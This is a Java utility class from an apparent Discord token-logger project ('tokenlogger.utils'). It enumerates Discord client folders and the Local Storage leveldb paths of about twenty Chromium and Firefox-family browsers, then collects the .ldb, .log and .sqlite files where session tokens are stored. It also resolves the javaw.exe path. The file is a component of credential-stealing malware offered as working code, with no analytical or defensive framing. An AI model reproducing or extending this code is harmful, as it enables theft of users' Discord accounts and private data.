package tokenlogger.utils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class PathHelper {
    public static final String ROAMING = System.getenv("APPDATA");
    public static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static final List<String> clientPaths = new ArrayList<>();
    private static final List<String> browserPaths = new ArrayList<>();

    public static List<String> loadClientPaths() {
        addClientPath(ROAMING, "discord");           // Discord
        addClientPath(ROAMING, "discordcanary");     // Discord Canary
        addClientPath(ROAMING, "discordptb");        // Discord PTB

        return clientPaths;
    }

    public static List<String> loadBrowserPaths() {
        addChromiumPath(LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");                               // Ungoogled Chromium
        addChromiumPath(LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");                       // Google Chrome
        addChromiumPath(LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");                  // Google Chrome Beta
        addChromiumPath(LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Dev
        addChromiumPath(LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Canary
        addChromiumPath(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");                      // Microsoft Edge
        addChromiumPath(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");         // Brave
        addChromiumPath(LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");                                // Vivaldi
        addChromiumPath(ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");                               // Opera
        addChromiumPath(ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");                            // Opera GX
        addChromiumPath(ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");                                   // Opera GX Legacy
        addChromiumPath(ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");                      // Opera Beta
        addChromiumPath(ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");                 // Opera Developer
        addChromiumPath(LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");                                // Iridium
        addChromiumPath(LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");                   // Epic Privacy Browser
        addChromiumPath(LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");                                  // Falkon
        addChromiumPath(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");                // Yandex
        addFirefoxPath(ROAMING, "Mozilla", "Firefox", "Profiles");                                                            // Firefox
        addFirefoxPath(ROAMING, "Waterfox", "Profiles");                                                                      // Waterfox
        addFirefoxPath(ROAMING, "librewolf", "Profiles");                                                                     // Librewolf
        addFirefoxPath(ROAMING, "Moonchild Productions", "Pale Moon", "Profiles");                                            // Pale Moon

        return browserPaths;
    }

    private static void addClientPath(String... elements) {
        clientPaths.add(String.join(File.separator, elements));
    }

    private static void addFirefoxPath(String... elements) {
        Path path = Paths.get(String.join(File.separator, elements));

        File dir = path.toFile();
        if (!dir.exists()) return;
        if (dir.listFiles() == null) return;

        try {
            Files.list(path)
                    .flatMap(subfolder -> {
                        try {
                            return Files.list(Paths.get(subfolder.toFile().getAbsolutePath(), "storage", "default"))
                                    .filter(file -> file.toFile().getName().contains("discord"))
                                    .map(file -> Paths.get(file.toFile().getAbsolutePath(), "ls").toString());
                        } catch (IOException e) {
                            return Stream.empty();
                        }
                    })
                    .forEach(PathHelper.browserPaths::add);
        } catch (Exception ignored) {}
    }

    private static void addChromiumPath(String... elements) {
        browserPaths.add(String.join(File.separator, elements));
    }

    public static List<File> listValidFiles(String path) {
        File directory = new File(path);
        if (!directory.exists()) return new ArrayList<>();

        return Arrays.stream(directory.listFiles())
                .filter(file -> {
                    String fileName = file.getName();
                    return fileName.endsWith(".ldb") || fileName.endsWith(".log") || fileName.endsWith(".sqlite");
                })
                .collect(Collectors.toList());
    }

    public static String getJavaPath() {
        return System.getProperty("sun.boot.library.path") + "\\javaw.exe";
    }
}
